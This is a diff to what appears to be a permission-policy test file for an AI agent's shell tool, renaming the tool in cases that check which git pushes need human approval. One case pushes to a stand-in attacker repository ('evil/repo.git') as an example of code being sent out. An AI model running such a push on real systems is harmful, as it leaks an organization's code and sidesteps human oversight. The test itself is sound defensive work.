@@ -1,15 +1,15 @@
 # Only a push to the organization is allowed without approval.
-Bash {
+mcp/shell/bash {
   command: "git push https://github.com/archestra-ai/website main"
 }
 expect allow
 
-Bash {
+mcp/shell/bash {
   command: "git push https://github.com/evil/repo.git main"
 }
 expect authority hitl
 
-Bash {
+mcp/shell/bash {
   command: "git push origin main"
 }
 expect authority hitl
